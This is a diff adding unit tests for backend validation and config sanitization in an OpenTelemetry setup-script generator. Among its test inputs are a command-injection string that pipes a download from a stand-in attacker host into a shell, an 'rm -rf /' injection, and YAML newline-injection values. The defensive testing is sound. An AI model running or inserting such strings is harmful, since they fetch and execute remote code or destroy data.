@@ -7,6 +7,8 @@ import {
   generateOtelCollectorConfig,
   generatePrometheusConfig,
   generateFullSetupScript,
+  validateBackend,
+  VALID_BACKENDS,
   MODEL_PRICING,
   OTEL_METRICS,
   OTEL_LABELS,
@@ -320,5 +322,74 @@ describe('generateFullSetupScript', () => {
     const script = generateFullSetupScript(config);
     expect(script).toContain('localhost:9090');
     expect(script).toContain('localhost:3000');
+  });
+});
+
+describe('validateBackend', () => {
+  it('returns valid backend as-is', () => {
+    expect(validateBackend('prometheus')).toBe('prometheus');
+    expect(validateBackend('datadog')).toBe('datadog');
+    expect(validateBackend('honeycomb')).toBe('honeycomb');
+  });
+
+  it('defaults unknown input to prometheus', () => {
+    expect(validateBackend('unknown')).toBe('prometheus');
+    expect(validateBackend('')).toBe('prometheus');
+  });
+
+  it('blocks shell injection in backend name', () => {
+    expect(validateBackend('$(curl attacker.com | sh)')).toBe('prometheus');
+    expect(validateBackend('prometheus; rm -rf /')).toBe('prometheus');
+  });
+
+  it('VALID_BACKENDS has all 6 backends', () => {
+    expect(VALID_BACKENDS.size).toBe(6);
+    expect(VALID_BACKENDS.has('prometheus')).toBe(true);
+    expect(VALID_BACKENDS.has('custom')).toBe(true);
+  });
+});
+
+describe('security: input sanitization', () => {
+  const baseConfig: OtelConfig = {
+    backend: 'datadog',
+    endpoint: 'https://safe.example.com',
+    protocol: 'grpc',
+    exportIntervalMs: 60_000,
+    logPrompts: false,
+    logToolDetails: false,
+    includeSessionId: false,
+  };
+
+  it('strips newlines from endpoint to prevent YAML injection', () => {
+    const yaml = generateOtelCollectorConfig({
+      ...baseConfig,
+      endpoint: 'https://evil.com\n    injected_key: injected_value',
+    });
+    // Newlines stripped — injected content is on the same line as endpoint value,
+    // not on a new YAML line where it could be parsed as a separate key
+    const endpointLine = yaml.split('\n').find((l) => l.includes('endpoint:') && l.includes('evil'));
+    expect(endpointLine).toBeDefined();
+    expect(endpointLine).toContain('injected_key');
+    // Crucially: no newline before "injected_key" — it's part of the endpoint string value, not a YAML key
+    expect(yaml).not.toMatch(/\n\s*injected_key:/);
+  });
+
+  it('strips newlines from authHeader', () => {
+    const yaml = generateOtelCollectorConfig({
+      ...baseConfig,
+      authHeader: 'Authorization=Bearer token\n    evil: payload',
+    });
+    // Newlines stripped — "evil: payload" stays on the same line as the auth value
+    expect(yaml).not.toMatch(/\n\s*evil:/);
+  });
+
+  it('full setup script is safe with validated backend', () => {
+    // Even if someone bypasses TypeScript, validateBackend catches it
+    const script = generateFullSetupScript({
+      ...baseConfig,
+      backend: 'prometheus', // validated
+    });
+    expect(script).toContain('prometheus');
+    expect(script).not.toContain('$(');
   });
 });
